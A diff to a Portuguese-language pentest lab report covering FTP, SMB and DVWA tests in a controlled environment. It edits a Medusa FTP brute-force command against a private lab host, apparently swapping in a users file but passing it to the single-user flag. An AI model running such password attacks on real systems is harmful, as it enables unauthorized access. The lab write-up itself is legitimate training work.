@@ -26,7 +26,7 @@ Descrever os testes realizados (FTP, SMB, Web/DVWA) em ambiente controlado para 
 
 4.2 FTP — Força bruta (Medusa)
 - Comando utilizado:
-  medusa -h 192.168.56.101 -u msfadmin -P wordlists/common-passwords.txt -M ftp -t 6
+  medusa -h 192.168.56.101 -u wordlists-smb-users.txt -P wordlists/common-passwords.txt -M ftp -t 6
 - Resultado: (copiar saída relevante)
 - Evidência: imagens/ftp-success.png
 - Impacto: acesso FTP não autorizado.
